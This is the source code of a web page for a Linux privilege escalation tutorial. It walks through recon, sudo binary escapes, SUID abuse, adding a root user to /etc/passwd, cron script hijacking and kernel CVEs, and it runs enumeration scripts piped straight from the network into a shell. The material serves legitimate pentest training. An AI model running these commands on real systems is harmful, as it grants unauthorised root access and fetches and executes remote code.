import { Metadata } from 'next';
import GuideLayout from '@/components/GuideLayout';

export const metadata: Metadata = {
  title: 'Linux Privilege Escalation Tutorial | 30+ Methods | Zentrion',
  description: 'Complete guide to Linux Privilege Escalation. Learn how to exploit SUID binaries, misconfigured sudoers, cron jobs, and kernel vulnerabilities to gain root access.',
  keywords: 'linux privilege escalation, privesc, suid binaries, gtfobins, root access, dirty cow, linux security',
};

export default function LinuxPrivEscTutorialPage() {
  return (
    <GuideLayout
      title="Linux Privilege Escalation – 30+ Methods"
      description="You have a low-privileged shell on a Linux server. How do you become root? This guide covers 30+ techniques including SUID/SGID exploitation, Sudo misconfigurations, Cron jobs, and Kernel exploits."
      timeToRead="45 min read"
      lastUpdated="September 2026"
      tags={['Linux', 'Privilege Escalation', 'Red Teaming']}
      tools={[
        { name: 'Unix Timestamp Converter', url: '/tools/unix-timestamp' },
        { name: 'Regex Tester', url: '/tools/regex-tester' }
      ]}
      relatedGuides={[
        { title: 'Kali Linux Pentesting', url: '/guides/kali-linux-pentesting-tutorial' },
        { title: 'Active Directory Attacks', url: '/guides/active-directory-attacks' }
      ]}
      headings={[
        { id: 'recon', label: 'Step 0: Initial Recon' },
        { id: 'sudo', label: '1. Sudo Misconfigurations' },
        { id: 'suid', label: '2. SUID & SGID Binaries' },
        { id: 'files', label: '3. World-Writable Files & Cron' },
        { id: 'kernel', label: '4. Kernel Exploits' },
        { id: 'tools', label: 'Automated Enumeration Tools' },
        { id: 'lab', label: 'Practice Lab (LinPEAS)' }
      ]}
    >
      <div className="callout-tool">
        <strong>💡 Pro Tip:</strong> Bookmark <a href="https://gtfobins.github.io/" target="_blank" rel="noopener noreferrer">GTFOBins</a> — It is the ultimate cheatsheet for bypassing local security restrictions using misconfigured Unix binaries.
      </div>

      <h2 id="recon">Step 0: Initial Recon (5 min)</h2>
      <p>Before blindly throwing exploits, understand the environment you landed in.</p>
      
      <pre><code>{`# What user am I? What groups do I belong to?
id
whoami

# What is the OS and Kernel version? (Crucial for Kernel Exploits)
uname -a
cat /etc/os-release

# What commands can I run as root without a password?
sudo -l

# What is running in the background?
ps auxf
systemctl list-units --type=service

# Are there any hidden files in home directories?
ls -la /home/*/`}</code></pre>

      <h2 id="sudo">1. Sudo Misconfigurations</h2>
      <p>If <code>sudo -l</code> shows that your user can run a specific binary as root without a password, you can often break out of that binary to spawn a root shell.</p>

      <pre><code>{`# Scenario: You can run 'find' as root
sudo find / -exec /bin/sh \\; -quit

# Scenario: You can run 'awk' as root
sudo awk 'BEGIN { system("/bin/sh") }'

# Scenario: You can run 'tar' as root
sudo tar --checkpoint-action=exec=id

# Scenario: You can run 'vim' or 'nano' as root
sudo vim /etc/passwd  # Edit the password file and add a new root user!
sudo less /etc/shadow # Type !bash while in less to drop into a root shell`}</code></pre>

      <h2 id="suid">2. SUID & SGID Binaries</h2>
      <p>SUID (Set Owner User ID) is a permission bit that allows a user to execute a file with the permissions of the file's owner (usually root). If a vulnerable binary has the SUID bit set, it's an easy path to root.</p>

      <pre><code>{`# Find all files with the SUID bit set:
find / -perm -4000 -type f 2>/dev/null

# Example output: /usr/bin/python3
# If Python has SUID set, you can execute a shell as root:
/usr/bin/python3 -c 'import os; os.execl("/bin/sh","sh","-c","id")'

# Find all files with SGID bit set:
find / -perm -2000 -type f 2>/dev/null`}</code></pre>

      <h2 id="files">3. World-Writable Files, Directories, and Cron Jobs</h2>
      <p>A sloppy sysadmin might leave sensitive files open to everyone, or schedule tasks that execute world-writable scripts.</p>

      <h3>Writable /etc/passwd</h3>
      <pre><code>{`# If /etc/passwd is writable, you can add a new root user:
# Format: username:password_hash:UID:GID:info:home:shell
echo "pwned::0:0::/root:/bin/bash" >> /etc/passwd
su pwned`}</code></pre>

      <h3>Vulnerable Cron Jobs</h3>
      <pre><code>{`# View scheduled tasks
cat /etc/crontab

# If a cron job runs a script as root, and you have write access to that script:
echo "/bin/sh -c 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash'" > /path/to/writable/script.sh
# Wait for the cron job to run, then execute: /tmp/rootbash -p`}</code></pre>

      <h2 id="kernel">4. Kernel Exploits</h2>
      <p>If the system hasn't been updated, the Kernel itself might be vulnerable. Use this as a last resort, as kernel exploits can crash the server (Kernel Panic).</p>
      
      <ul>
        <li><strong>Dirty COW (CVE-2016-5195):</strong> Affects kernels 2.6.22 - 4.8.3.</li>
        <li><strong>Dirty Pipe (CVE-2022-0847):</strong> Affects kernels 5.8 - 5.16.11. Allows overwriting data in read-only files (like /etc/passwd).</li>
        <li><strong>PwnKit (CVE-2021-4034):</strong> A flaw in <code>polkit</code>. Affects almost all major Linux distributions if not patched.</li>
      </ul>

      <pre><code>{`# Example: Checking for PwnKit vulnerability
pkexec --version
# If vulnerable, download the C exploit, compile with gcc, and run.`}</code></pre>

      <h2 id="tools">Automated Enumeration Tools</h2>
      <p>Instead of running manual checks, use automation scripts to highlight vulnerabilities in color-coded output.</p>
      
      <h3>LinPEAS (Linux Privilege Escalation Awesome Script)</h3>
      <pre><code>{`# Download and execute LinPEAS directly in memory
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh`}</code></pre>

      <h3>Linux Smart Enumeration (LSE)</h3>
      <pre><code>{`curl -L https://raw.githubusercontent.com/diego-trejo/Linux-SMART-Enumeration/master/lse.sh | bash`}</code></pre>

      <h2 id="lab">Practice Lab</h2>
      <p>To practice these techniques safely, use the following free resources:</p>
      <ul>
        <li><a href="https://tryhackme.com/room/linprivesc" target="_blank" rel="noopener noreferrer">TryHackMe: Linux Privilege Escalation</a> — An interactive, browser-based VM designed specifically to teach these exact techniques.</li>
        <li><a href="https://www.vulnhub.com/" target="_blank" rel="noopener noreferrer">VulnHub</a> — Download VMs like "Kioptrix" or "Stapler" to practice in your own VirtualBox environment.</li>
      </ul>
    </GuideLayout>
  );
}
